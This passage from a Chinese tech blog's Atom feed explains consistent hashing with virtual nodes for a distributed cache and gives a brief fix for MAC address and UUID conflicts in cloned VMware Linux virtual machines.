title="一般的哈希算法"></a>一般的哈希算法</h2><p>对于一个分布式缓存系统，一个key对应的节点应该是确定的，因此可以使用哈希算法将key和节点进行映射，如： <code>hash(key)%n=1</code>，对key做一次哈希运算后再对节点数量取余得到1，这就能将key映射到节点1，如果要查找key就直接请求节点1。</p><p>但这样做又一个很致命的问题：如果有一个节点宕机或者有新的节点加入，都会导致基数n的变化，那么对于一个key而言，与它映射的节点就会发生变化，因此对于所有现存的key都需要重新计算与节点之间的映射关系，否则就会导致数据查询不到，即大多数的缓存都会失效。但是这个做法数据迁移的成本太高了，而且同一时间过多的缓存同时失效，容易引起 <code>缓存雪崩</code> 。</p><blockquote><p>缓存雪崩：缓存在同一时刻全部失效，造成瞬时DB请求量大、压力骤增，引起雪崩。常因为缓存服务器宕机，或缓存设置了相同的过期时间引起。</p></blockquote><h2 id="一致性哈希算法"><a href="#一致性哈希算法" class="headerlink" title="一致性哈希算法"></a>一致性哈希算法</h2><p>为了避免在扩容或缩容时映射关系发生过多的数据迁移， <code>一致性哈希算法</code>出现了。</p><p><code>一致性哈希算法</code>和 <code>一般的哈希算法</code>一样，也是进行取模操作。但不同的是，一般的哈希算法是对节点数量取模，而一致性哈希算法则是对一个固定值 <code>2^32</code> 取模。</p><h3 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h3><p>一致性哈希算法将 key 映射到 2^32 的空间中，将这个数字首尾相连，形成一个环。</p><ul><li>计算节点(通常使用节点的名称、编号和 IP 地址)的哈希值，放置在环上。</li><li>计算 key 的哈希值，放置在环上，顺时针寻找到的第一个节点，就是应选取的节点。</li></ul><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241026202709942.png" alt="image-20241026202709942"></p><p>一致性哈希算法在新增&#x2F;删除节点时，只需要重新定位该节点附近的一小部分数据，而不需要重新定位所有的节点，这就解决了数据迁移过多的问题。</p><h3 id="数据倾斜问题"><a href="#数据倾斜问题" class="headerlink" title="数据倾斜问题"></a>数据倾斜问题</h3><p>如果服务器的节点过少，容易引起 key 的倾斜。例如上面例子中的 peer2，peer4，peer6 分布在环的上半部分，下半部分是空的。那么映射到环下半部分的 key 都会被分配给 peer2，key 过度向 peer2 倾斜，缓存节点间负载不均。</p><p>为了解决这个问题，引入了虚拟节点的概念，一个真实节点对应多个虚拟节点。</p><p>假设 1 个真实节点对应 3 个虚拟节点，那么 peer1 对应的虚拟节点是 peer1-1、 peer1-2、 peer1-3（通常以添加编号的方式实现），其余节点也以相同的方式操作。</p><ul><li>第一步，计算虚拟节点的 Hash 值，放置在环上。</li><li>第二步，计算 key 的 Hash 值，在环上顺时针寻找到应选取的虚拟节点，例如是 peer2-1，那么就对应真实节点 peer2。</li></ul><p>虚拟节点扩充了节点的数量，解决了节点较少的情况下数据容易倾斜的问题。而且代价非常小，只需要增加一个字典(map)维护真实节点与虚拟节点的映射关系即可。</p><img src="https://minio.drivefly.cn:443/image-hoshino/blog/2024/11/25/image-20241026202719407.png" alt="image-20241026202719407" style="zoom: 50%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;[!NOTE]&lt;/p&gt;
&lt;p&gt;原项目链接：&lt;a href=&quot;https://geektutu.com/post/geecache.html&quot;&gt;https://geektutu.com/post/geecache.html&lt;/a&gt;&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="Go" scheme="http://blog.hoshinobunny.xyz/tags/Go/"/>
    
    <category term="分布式缓存" scheme="http://blog.hoshinobunny.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98/"/>
    
    <category term="Redis" scheme="http://blog.hoshinobunny.xyz/tags/Redis/"/>
    
    <category term="一致性哈希" scheme="http://blog.hoshinobunny.xyz/tags/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/"/>
    
  </entry>
  
  <entry>
    <title>VMware克隆后的虚拟机存在mac地址冲突问题</title>
    <link href="http://blog.hoshinobunny.xyz/2024/10/26/VMware%E5%85%8B%E9%9A%86%E5%90%8E%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AD%98%E5%9C%A8mac%E5%9C%B0%E5%9D%80%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98%200ad07e84d5c44aa4ac17822ed66e16b0/"/>
    <id>http://blog.hoshinobunny.xyz/2024/10/26/VMware%E5%85%8B%E9%9A%86%E5%90%8E%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AD%98%E5%9C%A8mac%E5%9C%B0%E5%9D%80%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98%200ad07e84d5c44aa4ac17822ed66e16b0/</id>
    <published>2024-10-26T11:30:49.000Z</published>
    <updated>2024-11-25T08:42:07.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VMware克隆后的虚拟机存在mac地址冲突问题"><a href="#VMware克隆后的虚拟机存在mac地址冲突问题" class="headerlink" title="VMware克隆后的虚拟机存在mac地址冲突问题"></a>VMware克隆后的虚拟机存在mac地址冲突问题</h1><h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><p>克隆虚拟机后重启网卡，报错信息：Bringing up interface eth0: Device eth0 does not seem to be present,delaying initialization.</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/Untitled.png" alt="Untitled"></p><h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><ul><li>查看虚拟机设置中的mac地址</li></ul><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/Untitled%201.png" alt="Untitled"></p><ul><li>修改 <code>/etc/sysconfig/network-scripts/ifcfg-eth0</code> 配置文件中的 <code>HWADDR</code>，如下所示：</li></ul><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/Untitled%202.png" alt="Untitled"></p><ul><li>输入指令 <code>uuidgen</code> 生成一串uuid，并相应地修改上述配置文件的 <code>UUID</code> 字段值，最后重启一下网卡或者reboot一下就好了</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VMware克隆后的虚拟机存在mac地址冲突问题&quot;&gt;&lt;a href=&quot;#VMware克隆后的虚拟机存在mac地址冲突问题&quot; class=&quot;headerlink&quot; title=&quot;VMware克隆后的虚拟机存在mac地址冲突问题&quot;&gt;&lt;/a&gt;VMware克隆后的虚拟机存</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="VMware" scheme="http://blog.hoshinobunny.xyz/tags/VMware/"/>
    
    <category term="网络" scheme="http://blog.hoshinobunny.xyz/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="踩坑" scheme="http://blog.hoshinobunny.xyz/tags/%E8%B8%A9%E5%9D%91/"/>
    
  </entry>
  
  <!--  -->
  <follow_challenge>
    <feedId>80109775630991360</feedId>
    <userId>80108855711883264</userId>
</follow_challenge>
</feed>
